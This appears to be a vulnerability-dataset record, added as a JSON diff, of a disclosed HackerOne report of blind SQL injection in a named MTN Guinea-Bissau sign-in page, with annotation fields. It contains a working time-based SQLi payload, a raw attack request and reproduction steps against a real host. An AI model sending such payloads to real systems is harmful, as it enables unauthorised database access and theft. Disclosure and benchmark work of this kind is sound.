@@ -1,0 +1,45 @@
+{
+    "reported_to": "MTN Group",
+    "reported_by": "lu3ky-13 ",
+    "title": "Blind SQL Injection ",
+    "content": "\nhello dear support\nI have found Blind SQL Injection on https://futexpert.mtngbissau.com/signin/\nparameters injectable phone_number=0&pin=1&submit=Continuar via post\nURL:https://futexpert.mtngbissau.com/signin/\nPost: email=0\nmy payload : phone_number=0'XOR(if(now()=sysdate()%2Csleep(0)%2C0))XOR'Z&pin=1&submit=Continuar\nHTTP request\nCode 725 Bytes\n1POST /signin/ HTTP/1.1\n2Host: futexpert.mtngbissau.com\n3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0\n4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n5Accept-Language: en-US,en;q=0.5\n6Accept-Encoding: gzip, deflate\n7Content-Type: application/x-www-form-urlencoded\n8Content-Length: 116\n9Origin: https://futexpert.mtngbissau.com\n10Connection: close\n11Referer: https://futexpert.mtngbissau.com/signin/\n12Cookie: _ga=GA1.2.807090149.1609258213; _gid=GA1.2.432006610.1609466934; PHPSESSID=87pejs8h0usb0ill37hit63an5\n13Upgrade-Insecure-Requests: 1\n14\n15phone_number=0%27XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%2812%29%2C0%29%29XOR%27Z+%3D%3E&pin=1&submit=Continuar\n16\nif you need more info I'm here thank you\nImpact\nAn attacker can use SQL injection it to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database. SQLi can also be used to add, modify and delete records in a database, affecting data integrity. Under the right circumstances, SQLi can also be used by an attacker to execute OS commands, which may then be used to escalate an attack even further.\n\n",
+    "severity": [
+        9.0,
+        10.0
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "SQL Injection"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1628980440,
+    "report_url": "https://hackerone.com/reports/1069531",
+    "vuln_category": "WEB_APP",
+    "is_multi_component": false,
+    "complexity": "LOW",
+    "novelty": "LOW",
+    "steps": [
+        [
+            1,
+            "Send a POST request to https://futexpert.mtngbissau.com/signin/ with the following parameters: phone_number=0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z&pin=1&submit=Continuar"
+        ],
+        [
+            2,
+            "Observe the response time or behavior to confirm if the sleep function was executed, indicating a successful Blind SQL Injection"
+        ]
+    ],
+    "vuln_description": "The vulnerability is a Blind SQL Injection in the login form of the website. The attacker can manipulate the phone_number parameter to execute arbitrary SQL commands, potentially bypassing authentication, retrieving database contents, or modifying data.",
+    "reason": "The attack involves a straightforward SQL injection payload targeting a single parameter. While it requires knowledge of SQL injection techniques, the payload is not complex and does not involve multiple components or subtle interactions.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null,
+    "injection_metadata": {
+        "is_simple_payload": false
+    },
+    "authnz_metadata": {
+        "reason": "The Blind SQL Injection vulnerability involves injecting malicious SQL queries into input parameters (phone_number and pin) to manipulate the database. This is not directly related to authentication or authorization bypass via session or resource ID manipulation, which is the focus of the proposed methodologies. The methodologies described are for detecting IDOR and AuthN/AuthZ bypass vulnerabilities by swapping user sessions or resource IDs, not for detecting SQL injection vulnerabilities.",
+        "is_detectable": false
+    }
+}
